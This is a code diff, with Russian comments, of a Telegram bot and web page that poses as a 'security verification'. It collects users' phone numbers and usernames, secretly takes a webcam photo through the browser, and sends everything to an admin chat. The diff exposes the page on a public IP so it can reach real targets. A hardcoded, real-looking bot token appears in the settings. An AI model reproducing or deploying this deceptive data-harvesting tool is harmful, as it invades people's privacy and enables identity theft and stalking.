@@ -10,10 +10,10 @@ import logging
 import random
 
 # === Настройки бота ===
-TOKEN = "7587592244:AAF6z_XL9nGrnMpVIkV4YksPA-Q5ZqTuJ1U"  # Твой токен
-ADMIN_ID = 2054091032  # Твой Telegram ID
-BOT_PORT = 8000
+TOKEN = "7587592244:AAF6z_XL9nGrnMpVIkV4YksPA-Q5ZqTuJ1U"  # ❗ заменить на свой токен
+ADMIN_ID = 2054091032  # ❗ заменить на свой Telegram ID
 SITE_PORT = 5000
+SERVER_IP = "ВАШ_ПУБЛИЧНЫЙ_IP"  # Замени на свой публичный IP
 PHOTOS_DIR = "photos"
 DB_PATH = "users.db"
 
@@ -118,7 +118,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
                     document.body.innerHTML = `
                         <h2>✅ Авторизация завершена</h2>
                         <p>Вы успешно прошли проверку.</p>
-                        <p>Можете вернуться в Telegram.</p>
+                        <p>Можете закрыть эту страницу.</p>
                     `;
                 });
             }, 'image/png');
@@ -155,10 +155,7 @@ def save_photo():
 
         # === Отправка сообщения пользователю в Telegram ===
         url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = {
-            "chat_id": user_id,
-            "text": "✅ Авторизация успешна!\n\nВы успешно прошли проверку безопасности.",
-        }
+        data = {"chat_id": user_id, "text": "✅ Авторизация успешна!\n\nВы успешно прошли проверку безопасности."}
         requests.post(url, data=data)
 
         # === Отправка фото админу ===
@@ -173,18 +170,11 @@ def save_photo():
         if photo_path and os.path.exists(photo_path):
             with open(photo_path, 'rb') as f:
                 files = {'photo': f}
-                data_admin = {
-                    'chat_id': ADMIN_ID,
-                    'caption': message
-                }
-                requests.post(f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendPhoto",
-                              data=data_admin, files=files)
+                data_admin = {'chat_id': ADMIN_ID, 'caption': message}
+                requests.post(f'https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendPhoto', data=data_admin, files=files)
         else:
-            data_admin = {
-                'chat_id': ADMIN_ID,
-                'text': message
-            }
-            requests.post(f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage", data=data_admin)
+            data_admin = {'chat_id': ADMIN_ID, 'text': message}
+            requests.post(f'https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage', data=data_admin)
 
         return 'OK'
     except Exception as e:
@@ -222,7 +212,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.contact:
         phone = update.message.contact.phone_number
         user = update.effective_user
-        link = f"http://localhost:{SITE_PORT}/auth?user_id={user.id}&username={user.username}&phone={phone}"
+        link = f"http://{SERVER_IP}:{SITE_PORT}/auth?user_id={user.id}&username={user.username}&phone={phone}"
         await update.message.reply_text("🔄 Регистрация почти завершена.")
         await update.message.reply_text(f"🌐 Перейдите по ссылке:\n{link}")
     elif update.message.text == "✍️ Ввести вручную":
@@ -230,7 +220,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         phone = update.message.text
         user = update.effective_user
-        link = f"http://localhost:{SITE_PORT}/auth?user_id={user.id}&username={user.username}&phone={phone}"
+        link = f"http://{SERVER_IP}:{SITE_PORT}/auth?user_id={user.id}&username={user.username}&phone={phone}"
         await update.message.reply_text("🔄 Регистрация почти завершена.")
         await update.message.reply_text(f"🌐 Перейдите по ссылке:\n{link}")
 
@@ -257,7 +247,6 @@ async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(msg)
             if user[4] and os.path.exists(user[4]):
                 try:
-                    time.sleep(2)
                     await update.message.reply_photo(photo=open(user[4], 'rb'))
                 except Exception as e:
                     await update.message.reply_text(f"❌ Не удалось загрузить фото: {e}")
@@ -274,7 +263,7 @@ async def cleardb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for f in os.listdir(PHOTOS_DIR):
         os.remove(os.path.join(PHOTOS_DIR, f))
 
-    # Удаление базы данных
+    # Удаление базы и пересоздание
     if os.path.exists(DB_PATH):
         os.remove(DB_PATH)
         init_db()
@@ -287,20 +276,15 @@ async def post_init(application):
 
 def run_bot():
     application = ApplicationBuilder().token(TOKEN).post_init(post_init).build()
-
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("info", info_command))
     application.add_handler(CommandHandler("cleardb", cleardb_command))
     application.add_handler(CallbackQueryHandler(agree_handler, pattern="agree"))
     application.add_handler(MessageHandler(filters.ALL, handle_message))
-
-    print("🤖 Бот готов принимать команды...")
     application.run_polling()
 
-# === Запуск сайта и бота вместе ===
 if __name__ == '__main__':
     site_thread = threading.Thread(target=run_site)
     site_thread.daemon = True
     site_thread.start()
-
     run_bot()
